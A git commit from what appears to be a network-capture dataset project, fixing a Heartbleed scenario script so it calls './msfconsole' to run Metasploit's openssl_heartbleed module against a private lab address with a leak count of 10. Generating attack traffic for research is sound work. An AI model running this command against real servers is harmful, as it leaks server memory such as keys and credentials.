117269dce64c5eb997edf1eb39ec0e7e2b947cae
Dylan Yuan <ygm971022@hotmail.com>
2023-03-31 17:08:27 +1000

    Fixed the Heartbleed scenario
    Fixed an issue where data could not be generated under the Heartbleed scenario

--- captures/capture-120-heartbleed/msf_share/msf_script.sh
+++ captures/capture-120-heartbleed/msf_share/msf_script.sh
@@ -6,5 +6,5 @@ WAIT=$((1 + RANDOM) % $MOD)
 
 sleep $WAIT
 
-msfconsole -x "use auxiliary/scanner/ssl/openssl_heartbleed; set RHOSTS 172.16.233.15; set verbose true; set LEAK_COUNT 10; exploit"
+./msfconsole -x "use auxiliary/scanner/ssl/openssl_heartbleed; set RHOSTS 172.16.233.15; set verbose true; set LEAK_COUNT 10; exploit"
 
